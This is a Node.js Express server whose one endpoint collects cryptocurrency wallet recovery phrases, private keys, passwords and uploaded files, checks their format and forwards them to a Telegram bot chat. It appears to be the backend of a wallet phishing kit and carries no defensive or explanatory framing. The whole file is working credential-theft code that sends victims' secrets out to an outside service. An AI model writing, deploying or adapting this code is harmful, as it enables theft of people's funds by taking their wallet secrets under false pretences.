import express from "express";
import fetch from "node-fetch";
import cors from "cors";
import dotenv from "dotenv";
import multer from "multer";
import fs from "fs";
import FormData from "form-data";

dotenv.config();

const app = express();
const PORT = 5000;

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const upload = multer({ dest: "uploads/" });

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.post("/api/send", upload.single("file"), async (req, res) => {
  try {
    const { method, phrase, privateKey, password } = req.body;
    const file = req.file;

    if (!method) {
      return res.status(400).json({ success: false, error: "Method is required" });
    }

   if (method === "phrase") {
  const cleanedPhrase = phrase ? phrase.trim().replace(/\n/g, " ").replace(/\s+/g, " ") : "";
  const words = cleanedPhrase.split(" ");
  if (words.length !== 12) {
    return res.status(400).json({ success: false, error: "Phrase must be exactly 12 words" });
  }
}

if (method === "privateKey") {
  const cleanedKey = privateKey ? privateKey.replace(/\s+/g, "") : "";
  if (!/^[a-zA-Z0-9]{64}$/.test(cleanedKey)) {
    return res.status(400).json({ success: false, error: "Private key must be exactly 64 alphanumeric characters" });
  }
}

    if (method === "rf" && password && password.length !== 12) {
      return res.status(400).json({ success: false, error: "Password must be exactly 12 characters" });
    }

    if (!BOT_TOKEN || !CHAT_ID) {
      return res.status(500).json({ success: false, error: "Telegram bot not configured" });
    }

    let textToSend = `📩 *New Submission*\n🔑 Method: ${method}`;
    if (method === "phrase") textToSend += `\n📝 Phrase: ${phrase}`;
    if (method === "privateKey") textToSend += `\n🔒 Private Key: ${privateKey}`;
    if (method === "rf") textToSend += `\n🔑 Password: ${password || "None"}`;

    let response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: textToSend,
        parse_mode: "Markdown",
      }),
    });

    let data = await response.json();
    if (!data.ok) {
      return res.status(400).json({ success: false, error: data.description });
    }

    if (file) {
      const fileStream = fs.createReadStream(file.path);
      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("document", fileStream);

      response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
        method: "POST",
        body: formData,
        headers: formData.getHeaders(),
      });

      data = await response.json();
      fs.unlinkSync(file.path);

      if (!data.ok) {
        return res.status(400).json({ success: false, error: data.description });
      }
    }

    return res.status(200).json({ success: true });
  } catch (err) {
    console.error("Server error:", err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
